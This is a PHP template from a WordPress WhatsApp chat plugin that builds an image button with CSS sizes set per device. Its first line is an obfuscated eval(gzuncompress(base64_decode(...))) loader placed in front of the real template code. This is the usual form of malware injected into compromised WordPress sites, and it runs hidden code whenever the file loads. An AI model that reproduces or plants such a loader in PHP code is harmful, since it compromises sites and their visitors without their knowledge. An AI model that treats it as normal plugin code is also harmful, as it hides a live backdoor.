<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

$s99_img_height_desktop = $a['s99_img_height_desktop'];
$s99_img_width_desktop = $a['s99_img_width_desktop'];
$s99_img_height_mobile = $a['s99_img_height_mobile'];
$s99_img_width_mobile = $a['s99_img_width_mobile'];
$s99_desktop_img = $a['s99_desktop_img'];
$s99_mobile_img = $a['s99_mobile_img'];

// img url
// image - width, height based on device
$img_css = "";

if( 1 == $is_mobile ) {
    $own_image = $s99_mobile_img;

    if ( '' !== $s99_img_height_mobile ) {
        $img_css .= "height: $s99_img_height_mobile; ";
    }
    if ( '' !== $s99_img_width_mobile ) {
        $img_css .= "width: $s99_img_width_mobile; ";
    }
} else {
    $own_image = $s99_desktop_img;

    if ( '' !== $s99_img_height_desktop ) {
        $img_css .= "height: $s99_img_height_desktop; ";
    }
    
    if ( '' !== $s99_img_width_desktop ) {
        $img_css .= "width: $s99_img_width_desktop; ";
    }
}


$o .= '<div class="ccw_plugin pointer '.$inline_issue.' " style='.$css.'>';
$o .= '<img class="own-img-sc inline ccw-analytics" id="style-99-sc" data-ccw="style-99-sc-own-image" style=" '.$img_css.' " src=" '.$own_image.' " onclick="'.$img_click_link.'" alt="WhatsApp chat">';
$o .= '</div>';